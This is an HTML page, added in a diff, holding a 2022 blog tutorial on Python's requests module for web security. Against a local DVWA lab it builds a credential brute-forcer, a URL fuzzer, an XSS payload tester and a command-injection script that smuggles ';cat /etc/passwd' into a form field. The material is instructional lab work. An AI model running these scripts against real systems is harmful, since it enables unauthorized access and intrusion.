@@ -1,0 +1,555 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <title>
+  Python for hackers: requests · Yusuf Talha ARABACI
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="Yusuf Talha ARABACI">
+<meta name="description" content="
+
+  Python for Hackers: requests
+  
+    
+    Link to heading
+  
+
+
+
+  Introduction
+  
+    
+    Link to heading
+  
+
+Hello, in this article, we will get to know Python&rsquo;s requests module, where we can write tools in the field of web application security.
+What is ###requests?
+requests is a simple but elegant HTTP module of Python. It allows you to send HTTP requests extremely easily. For requests made with the GET method, you do not need to manually add query strings to your URLs or formally encode your POST data, the requests module takes care of these tasks for you. In this article, we will write various web tools with requests, but let&rsquo;s take a look at the installation first. We assume that you have a basic knowledge of the Python language and continue. If you want, you can also look at the articles about Python on our website.">
+<meta name="keywords" content="cybersecurity, infosec, cloud-native security, soc architecture, open source defense, yusuf talha arabaci, malware analysis, pentesting">
+
+
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/images/profile.jpeg">
+  <meta name="twitter:title" content="Python for hackers: requests">
+  <meta name="twitter:description" content="Python for Hackers: requestsLink to headingIntroductionLink to headingHello, in this article, we will get to know Python’s requests module, where we can write tools in the field of web application security.
+What is ###requests?
+requests is a simple but elegant HTTP module of Python. It allows you to send HTTP requests extremely easily. For requests made with the GET method, you do not need to manually add query strings to your URLs or formally encode your POST data, the requests module takes care of these tasks for you. In this article, we will write various web tools with requests, but let’s take a look at the installation first. We assume that you have a basic knowledge of the Python language and continue. If you want, you can also look at the articles about Python on our website.">
+
+<meta property="og:url" content="http://localhost:1313/posts/2022/08/python-for-hackers-requests/">
+  <meta property="og:site_name" content="Yusuf Talha ARABACI">
+  <meta property="og:title" content="Python for hackers: requests">
+  <meta property="og:description" content="Python for Hackers: requestsLink to headingIntroductionLink to headingHello, in this article, we will get to know Python’s requests module, where we can write tools in the field of web application security.
+What is ###requests?
+requests is a simple but elegant HTTP module of Python. It allows you to send HTTP requests extremely easily. For requests made with the GET method, you do not need to manually add query strings to your URLs or formally encode your POST data, the requests module takes care of these tasks for you. In this article, we will write various web tools with requests, but let’s take a look at the installation first. We assume that you have a basic knowledge of the Python language and continue. If you want, you can also look at the articles about Python on our website.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-08-26T00:00:00+00:00">
+    <meta property="article:modified_time" content="2022-08-26T00:00:00+00:00">
+    <meta property="og:image" content="http://localhost:1313/images/profile.jpeg">
+
+
+
+
+<link rel="canonical" href="http://localhost:1313/posts/2022/08/python-for-hackers-requests/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.css" media="screen">
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.css" media="screen">
+  
+
+
+
+ 
+  
+    
+    <link rel="stylesheet" href="/css/custom.css" media="screen">
+  
+
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://localhost:1313/">
+      Yusuf Talha ARABACI
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">Posts</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/series/">Series</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">About</a>
+            </li>
+          
+        
+        
+          
+          
+          
+            
+              
+                <li class="navigation-item menu-separator">
+                  <span>|</span>
+                </li>
+                
+              
+              <li class="navigation-item">
+                <a href="/tr/posts/2022/08/hakerlar-i%C3%A7in-python-requests/">Türkçe</a>
+              </li>
+            
+          
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://localhost:1313/posts/2022/08/python-for-hackers-requests/">
+              Python for hackers: requests
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2022-08-26T00:00:00Z">
+                August 26, 2022
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              13-minute read
+            </span>
+          </div>
+          
+          
+          
+        </div>
+      </header>
+
+      
+
+
+      <div class="post-content">
+        
+        <hr>
+<h3 id="python-for-hackersrequests">
+  Python for Hackers: requests
+  <a class="heading-link" href="#python-for-hackersrequests">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p><img src="/images/1_a87phGSd-sbfiJLWPfGMxA.png" alt=""></p>
+<h3 id="introduction">
+  Introduction
+  <a class="heading-link" href="#introduction">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>Hello, in this article, we will get to know Python&rsquo;s <em>requests</em> module, where we can write tools in the field of web application security.</p>
+<p>What is ###requests?</p>
+<p><a href="https://requests.readthedocs.io/"  class="external-link" target="_blank" rel="noopener">requests</a> is a simple but elegant HTTP module of Python. It allows you to send HTTP requests extremely easily. For requests made with the GET method, you do not need to manually add query strings to your URLs or formally encode your POST data, the requests module takes care of these tasks for you. In this article, we will write various web tools with <em>requests</em>, but let&rsquo;s take a look at the installation first. We assume that you have a basic knowledge of the Python language and continue. If you want, you can also look at the <a href="https://pwnlab.me/intermediate-python-articles/"  class="external-link" target="_blank" rel="noopener">articles</a> about Python on our website.</p>
+<h3 id="installation">
+  Installation
+  <a class="heading-link" href="#installation">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>To install the request module, you can type the following command on your terminal screen.</p>
+<pre tabindex="0"><code>python -m pip install requests
+</code></pre><p>After the installation is completed, if you do not receive an error when you create a python file and write and run the code below, your installation is successful.</p>
+<pre tabindex="0"><code>import requests
+</code></pre><p>Now let&rsquo;s examine the structure of this module a little.</p>
+<h4 id="methods">
+  Methods
+  <a class="heading-link" href="#methods">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h4>
+<p>Although the request module has many methods, the important ones for us are the methods in which we make GET and POST requests. If you don&rsquo;t know what these are, you can search for <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods"  class="external-link" target="_blank" rel="noopener">HTTP request</a> methods.</p>
+<p>**get()**The type of request we use most is the GET request. When we enter any web page in our browser, we actually send a GET request. When we send a GET request to a URL address, it returns us the HTML dump (page source) of the page, and our browser interprets this HTML and shows us the page. (Not only HTML but also CSS and Javascript codes come with it, but we have no business with them) We can make GET requests with the <em>requests.get()</em> method. Its usage is basically as follows: <em>get(url, params, args)</em></p>
+<p>**post()**The POST method is generally used when submitting <a href="https://www.w3schools.com/html/html_forms.asp"  class="external-link" target="_blank" rel="noopener">HTML forms</a>. This method is used on login and registration pages. So we will use this method to perform a brute force attack on a login page. Unlike the GET method, the parameters/data we send with this method are not added to the URL. The <em>requests.post()</em> method is used to send POST requests. Its usage is basically as follows. <em>post(url, data, json, args)</em></p>
+<h4 id="parameters">
+  Parameters
+  <a class="heading-link" href="#parameters">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h4>
+<p><strong>url</strong> is the address of the web page to which we will send the GET or POST request.</p>
+<p><strong>params, data, json, files</strong>These parameters are the parameters/data we will send with GET or POST request. <em>params</em> are used in the get() method and others are used in the post() method. The use of these methods depends on the target site. If the target site does not receive a parameter value, there is no need to use them. If it takes parameters, that is, if it is an HTML form, we need to send the desired data to the <em>name</em> tag values.</p>
+<p><em><strong>params</strong></em>*:* In the get() method, it receives parameters/data in <em>tuple</em> structure. <br>
+<strong>data:</strong> The post() method takes parameters/data in the <em>tuple</em> structure. <br>
+<em><strong>json</strong></em>*:* In the post() method, it takes parameters/data in <em>json</em> structure. <br>
+<em><strong>files</strong></em>*:* In the post() method, it takes parameters/data in XML or different file types. In the GET request, parameters, that is, data, are added to the rest of the URL. Therefore, we can add parameters by directly editing the URL, or we can give data in the <em>dictionary</em> structure to the <em>params</em> parameter of the get() method. For this:</p>
+<pre tabindex="0"><code>params = {&#39;key1&#39;: &#39;value1&#39;, &#39;key2&#39;: &#39;value2&#39;}
+</code></pre><p>We define the parameters in the dictionary structure. When we make a request with these parameters, the parameters are added to the end of the URL as follows.</p>
+<pre tabindex="0"><code>https://httpbin.org/get?key2=value2&amp;key1=value1
+</code></pre><p>Now let&rsquo;s send a GET request by writing a small Python code.</p>
+<pre tabindex="0"><code>import requests  
+params = {&#39;key1&#39;: &#39;value1&#39;, &#39;key2&#39;: &#39;value2&#39;}  
+response = requests.get(&#39;https://httpbin.org/get&#39;, params=params)
+</code></pre><p>There are different ways to send data via POST request. Data can be sent in dictionary structure or json structure as in GET request: to send data in dictionary structure:</p>
+<pre tabindex="0"><code>data = {&#39;key1&#39;: &#39;value1&#39;, &#39;key2&#39;: &#39;value2&#39;}
+</code></pre><p>You can use the <a href="https://docs.python.org/3/library/json.html"  class="external-link" target="_blank" rel="noopener">json</a> module to send data in json structure.</p>
+<h4 id="args">
+  <strong>args</strong>
+  <a class="heading-link" href="#args">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h4>
+<p>The arguments are the same for the get() and post() methods and are optional.If not used, it is executed with its default values.</p>
+<p><em><strong>allow_redirects(bool)</strong></em><br>
+Gets TRUE/FALSE to enable/disable redirection. By default it is TRUE. So it allows redirects.<br>
+<em><strong>auth(tuple)</strong></em><br>
+Used to enable a specific HTTP authentication. Defaults to NULL, does not authenticate <br>
+<em><strong>cert(tuple)</strong></em><br>
+Retrieves a certificate file in <em>tuple</em> structure. By default it takes NULL value.<br>
+<em><strong>cookies(dict)</strong></em><br>
+Retrieves the cookie dictionary to send to the specified url. It does not send cookies by default. <br>
+<em><strong>headers(dict)</strong></em><br>
+Gets the HTTP header to be sent to the specified url. It does not send headers by default. <br>
+<em><strong>proxies(dict)</strong></em><br>
+Retrieves the protocol to be sent to the proxy URL. By default it takes NULL value. <br>
+<em><strong>stream(bool)</strong></em> Determines whether the response will be downloaded immediately (FALSE) or streamed (TRUE). By default it is FALSE, meaning the response is downloaded immediately. <br>
+<em><strong>timeout(int)</strong></em> Gets the timeout duration, which represents how many seconds to wait for the client to establish a connection and/or send a response. By default it is NULL, which means the request will continue until the connection is closed <br>
+<em><strong>verify(bool)</strong></em><br>
+It takes a value of TRUE to verify the TLS certificate of the servers and FALSE to turn off verification. By default it is TRUE.</p>
+<p>####response</p>
+<p>It is the response that the server returns to the request we sent. In the Python codes we wrote, we kept the response we received with the <em>get()</em> method in a variable named <em>response</em>. Now let&rsquo;s examine the content of this answer.</p>
+<pre tabindex="0"><code>print(response.text)
+</code></pre><p>We can print the content of the response as text. A text like the one below will appear.</p>
+<pre tabindex="0"><code>{  
+&#34;args&#34;: {  
+&#34;key1&#34;: &#34;value1&#34;,   
+&#34;key2&#34;: &#34;value2&#34;  
+},   
+&#34;headers&#34;: {  
+&#34;Accept&#34;: &#34;*/*&#34;,   
+&#34;Accept-Encoding&#34;: &#34;gzip, deflate&#34;,   
+&#34;host&#34;: &#34;httpbin.org&#34;,   
+&#34;User-Agent&#34;: &#34;python-requests/2.28.1&#34;,   
+&#34;X-Amzn-Trace-Id&#34;: &#34;Root=1-62e23811-6a7c14dc2c3bc62026eebb0c&#34;  
+},   
+&#34;origin&#34;: &#34;185.51.36.100&#34;,   
+&#34;url&#34;: &#34;https://httpbin.org/get?key1=value1&amp;key2=value2&#34;  
+}
+</code></pre><p>Here we see information about the answer we received. Let&rsquo;s also look at the type of response we receive.</p>
+<pre tabindex="0"><code>&gt;&gt;print(type(response))
+</code></pre><pre tabindex="0"><code>&lt;class &#39;requests.models.Response&#39;&gt;
+</code></pre><p>We understand that it is an object of type requests.models.Response. Looking at the <a href="https://requests.readthedocs.io/en/latest/_modules/requests/models/"  class="external-link" target="_blank" rel="noopener">source code</a>:</p>
+<p><img src="/images/0_L_iXdDv3gSm2uu6j.png" alt=""></p>
+<p>We see a long code. You can also access its documentation <a href="https://requests.readthedocs.io/en/latest/api/#requests.Response"  class="external-link" target="_blank" rel="noopener">here</a>. What is important for us here are the attiributes written in the __attrs__ section.</p>
+<pre tabindex="0"><code>print(response.__attrs__)
+</code></pre><pre tabindex="0"><code>[&#39;_content&#39;, &#39;status_code&#39;, &#39;headers&#39;, &#39;url&#39;, &#39;history&#39;, &#39;encoding&#39;, &#39;reason&#39;, &#39;cookies&#39;, &#39;elapsed&#39;, &#39;request&#39;]
+</code></pre><p>We can also see these attributes with the code above. With these attributes, we can reach the values ​​written in the text we receive from <em>response.text</em>, but what is important for us here is <em>content</em>.</p>
+<pre tabindex="0"><code>print(response.content)
+</code></pre><p>will return us the page source. Now let&rsquo;s make an application that takes the address of the given website and saves its source in an html file.</p>
+<pre tabindex="0"><code>import requests
+</code></pre><pre tabindex="0"><code>response = requests.get(&#39;https://www.google.com.tr&#39;)  
+f = open(&#34;source.html&#34;,&#34;w&#34;)  
+f.write(str(response.content))  
+f.close()
+</code></pre><p>You can see that the page source is pulled as follows. (with CSS and Javascript codes)</p>
+<p><img src="/images/0_W3QQk0ZEoY20GPcY.png" alt=""></p>
+<p>You can parse the page source with the <a href="https://pypi.org/project/beautifulsoup4/"  class="external-link" target="_blank" rel="noopener">BeautifulSoup</a> module and get the information you want from it. But in this article we will do something different.</p>
+<h3 id="pulling-malicious-websites-from-usom">
+  Pulling malicious websites from Usom
+  <a class="heading-link" href="#pulling-malicious-websites-from-usom">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p><a href="https://www.usom.gov.tr/"  class="external-link" target="_blank" rel="noopener">USOM</a>(National Cyber Incident Response Center) is an organization that operates on a 24/7 basis against cyber incidents in our country. It has a list in which it indexes harmful sites on the internet. You can access this list <a href="http://www.usom.gov.tr/url-list.txt"  class="external-link" target="_blank" rel="noopener">here</a>. Now let&rsquo;s try to pull this list with Python.</p>
+<pre tabindex="0"><code>import requests  
+response = requests.get(&#34;http://www.usom.gov.tr/url-list.txt&#34;, verify=False)  
+with open(&#34;usom.txt&#34;, &#34;wb&#34;) as binary_file:  
+  binary_file.write(response.content)
+</code></pre><p>We were able to pull this list with a simple GET request. Now, make sure that a URL we have is included in this list.Let&rsquo;s write a function that checks whether it is valid or not.</p>
+<pre tabindex="0"><code>def check(url):  
+  f = open(&#34;usom.txt&#34;)  
+  lines = f.read()  
+  lines = lines.split(&#39;\n&#39;)  
+  for line in lines:  
+    if line == url:  
+    text = url+&#34; is harmful&#34;  
+    return text
+</code></pre><pre tabindex="0"><code>  text = url+&#34; is not harmful.&#34;  
+  return text
+</code></pre><p>We have created an application that searches for the URL we gave to the function in the text file it finds, and returns it as harmless if it does not find that it is harmful to us.</p>
+<h3 id="brute-force-attack">
+  Brute Force Attack
+  <a class="heading-link" href="#brute-force-attack">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>Brute Force Attack is a simple but still effective type of attack that we can use to log into a web page using trial and error management in the hope of finding the right one. Let&rsquo;s see how we can do this with our python application. I will use the DVWA app for this.</p>
+<p><img src="/images/0_D7cpaI2bY2tgv3Ig.png" alt=""></p>
+<p>Here I listened to my login page with the <a href="https://portswigger.net/burp"  class="external-link" target="_blank" rel="noopener">burp suite</a> tool. I entered the value &lsquo;aa&rsquo; in the username and password fields and pressed the login button. The GET request was captured in the HTTP History section on my burp tool. Of course, you can also use different tools for this. We will use some of the information here. First of all, since we access the DVWA page by logging in, our Python application also needs to access the session somehow. So what is a session? To put it briefly, when we log in from a login page with our username/password information, we actually start a session. The session is terminated when we finish our work and close our browser or when a certain amount of time has passed. Web applications use cookies when creating a session; two cookies are created, one on the client computer and one on the server. The session continues as long as both cookies are not lost. Here, we will log in to the DVWA page and give the session cookie we received to our Python application, allowing it to access the web page with our session. The field marked in the Burp tool ‘PHPSESID’ is our session cookie. But we better hurry, the session is running out…</p>
+<pre tabindex="0"><code>import requests
+</code></pre><pre tabindex="0"><code>header = {&#34;Cookie&#34;: &#34;security=low; PHPSESSID=2d9gb38rft9o87vv22vbtnlu91&#34;} #We give the session cookie to the header.
+</code></pre><pre tabindex="0"><code>usernames = [&#34;admin&#34;, &#34;root&#34;, &#34;user&#34;, &#34;aa&#34;] #list of usernames we will use in the experiments  
+passwords = [&#34;resu&#34;, &#34;password&#34;, &#34;toor&#34;, &#34;1234&#34;] #list of passwords we will use in the tests
+</code></pre><pre tabindex="0"><code>for i in usernames:  
+  for j in passwords:  
+    url = f&#34;http://10.0.2.4/dvwa/vulnerabilities/brute/?username={i}&amp;password={j}&amp;Login=Login&#34;  
+    #Since our application works with GET request, we can try it by adding username and password information to the URL.  
+    result = requests.get(url=url, headers=header)  
+    if not &#34;Username and/or password incorrect&#34; in str(result.content):  
+      print(&#34;Username: &#34;, i)  
+      print(&#34;password: &#34;, j)  
+      print(&#34;Status code: &#34;,result.status_code)  
+      print(&#34;Length: &#34;, len(result.content))  
+      print(&#34;Username and Password is found&#34;)
+</code></pre><p><img src="/images/0_WFaG5gXYv4_u5frj.png" alt=""></p>
+<p>When we write the code in the python file and run it, it will make tests by sending GET requests to the live DVWA server.</p>
+<p>And yes, our attack was successful, we found the username and password information. Since the GET method was used on this web page, we were able to easily perform the attack by editing the URL. If the POST method had been used, we could have created a tuple according to the names of the <em>name</em> attributes in the HTML form and given it to the <em>data</em> parameter of the post() method and carried out our attack. That&rsquo;s enough tips, the rest is up to you&hellip;</p>
+<h3 id="url-fuzzing">
+  URL Fuzzing
+  <a class="heading-link" href="#url-fuzzing">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>In the URL Fuzzing process, a list of possible file/directory names is created and an http request is sent to the system. In this way, directories and files on the server are tried to be found. Of course, doing this process manually by trying it one by one is tiring. How about writing a little python code for this?</p>
+<pre tabindex="0"><code>import requests
+</code></pre><pre tabindex="0"><code>fuzzing_list = [&#39;/robots.txt&#39;,&#39;/etc/&#39;,&#39;/dvwa/&#39;,&#39;/passwd&#39;,&#39;/usr/&#39;,&#39;/index.php&#39;] #list to search  
+header = {&#34;Cookie&#34;: &#34;security=low; PHPSESSID=0k6634cfi19e5sfn2vb754uns6&#34;} Our session cookie on #dvwa
+</code></pre><pre tabindex="0"><code>for i in fuzzing_list:  
+  url = &#34;http://10.0.2.4&#34;+str(i) #We are trying to fuzz the rest of the dvwa server&#39;s IP address  
+  result = requests.get(url = url, headers = header)  
+  if &#34;200&#34; in str(result.status_code):  
+    print(&#34;file or directory is found: &#34;,i)  
+  else:  
+    print(&#34;file or directory isn&#39;t found: &#34;,i)
+</code></pre><p>When we run the Python code, it will try the directory and file names in the list and give us the following result.</p>
+<p><img src="/images/0_P0_DM5nuoLcNWX16.png" alt=""></p>
+<h3 id="xss-attack">
+  XSS Attack
+  <a class="heading-link" href="#xss-attack">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>XSS** is a security vulnerability that occurs when values taken from web page inputs are included in the page source without filtering. This is because harmful javascript codes may be included in the page from unfiltered input. There are many XSS scripts that can reveal this vulnerability. You can access a list I found on Github <a href="https://github.com/payloadbox/xss-payload-list"  class="external-link" target="_blank" rel="noopener">here</a>. In this application, we will make an application that checks whether the values in a list containing XSS scripts are added to the page source by sending them to the page. For this, I gave the session cookie we made in the previous application to the header variable again, I will not explain this part again.</p>
+<p>Our DVWA page works with GET request again, so we will use the <em>requests.get()</em> function. What we write in the input section is written in the <em>name</em> section of the URL. Based on this, we will give our XSS scripts to the <em>name</em> parameter.</p>
+<pre tabindex="0"><code>import requests
+</code></pre><pre tabindex="0"><code>header = {&#34;Cookie&#34;: &#34;security=low; PHPSESSID=2d9gb38rft9o87vv22vbtnlu91&#34;}  
+xss_list = [&#34;&lt;h1&gt;xss&lt;/h1&gt;&#34;,&#34;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&#34;,&#34;&lt;script&gt;prompt(&#39;xss&#39;)&lt;/script&gt;&#34;,&#34;XSS&#34;,&#34;alert(&#39;xss&#39;)&#34;]
+</code></pre><pre tabindex="0"><code>for payload in xss_list:  
+  url=&#34;http://10.0.2.4/dvwa/vulnerabilities/xss_r/?name=&#34;+payload Giving scripts to the #name parameter  
+  result = requests.get(url=url, headers=header) # Making the GET request  
+  if str(payload) in str(result.content):  
+    print(&#34;Possible XSS found: &#34;+str(payload))
+</code></pre><p>When we write the code in the python file and run it, it will make tests by sending GET requests to the live DVWA server.</p>
+<p><img src="/images/0_5GN1pw6l0XKQVsRQ.png" alt=""></p>
+<p>If we look at the result we got, our XSS scripts did not work because the web page was filtering. <h1>xss</h1> was an HTML injection script, while XSS is just a plain string. You can try different XSS scripts.</p>
+<h3 id="command-injection-attack">
+  Command Injection Attack
+  <a class="heading-link" href="#command-injection-attack">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>Command injection is a type of vulnerability also known as code execution vulnerability. Running it in the server shell without filtering the input causes this vulnerability. In this way, the attacker can run any malicious code he wants in the server shell. We will use DVWA&rsquo;s command injection web page in our application.</p>
+<p><img src="/images/0_Ik2wa2BdVo1Kxt3p.png" alt=""></p>
+<p>There is an entry here that pings the given IP address. When we add a semicolon to the rest of the ip and try to run the ls command, we see that it works and lists the server directory. Based on this, we can determine that there is a command injection vulnerability on this page. Now let&rsquo;s see how we can detect this vulnerability with Python.</p>
+<p><img src="/images/0_64jFt9fe7MaTcEu7.png" alt=""></p>
+<p>When we listen to the request we sent to the page with burp, we can see that this request was made with a POST method and the parameters sent. As we did in previous applications, we will give our session cookie (&lsquo;PHPSESSID) to our header parameter. Next, since it is a POST request, we will create a data tuple structure and give it to our post() method.</p>
+<pre tabindex="0"><code>import requests
+</code></pre><pre tabindex="0"><code>command = &#34;cat /etc/passwd&#34; #the command we want to run  
+header = {&#34;Cookie&#34;: &#34;security=low; PHPSESSID=0k6634cfi19e5sfn2vb754uns6&#34;} #session cookie  
+url = &#34;http://10.0.2.4/dvwa/vulnerabilities/exec/&#34; #web address we will attack  
+data = {&#34;ip&#34;:&#34;127.0.0.1;&#34;+command,&#34;Submit&#34;:&#34;Submit&#34;} The parameters we will send with the #POST method  
+response = requests.post(url=url, data=data, headers=header) #sending the request
+</code></pre><pre tabindex="0"><code>if &#34;www-data&#34; in str(response.content):  
+  print(&#34;command injection vulnerability found!&#34;)
+</code></pre><p>&lsquo;www-data&rsquo; consists of a string that we can understand that the command is working when it is found in the response, it is located in the passwd file. Using this method, you can run longer commands sequentially with Python.</p>
+<p><img src="/images/0_HJlxB5W113qQFTkD.png" alt=""></p>
+<p>As a result, we found the vulnerability by running the python code.</p>
+<h3 id="end">
+  End
+  <a class="heading-link" href="#end">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>I welcome comments on what other operations we can do in the field of web security with Python…</p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+    2026
+     Yusuf Talha ARABACI 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.js"></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+
+</html>
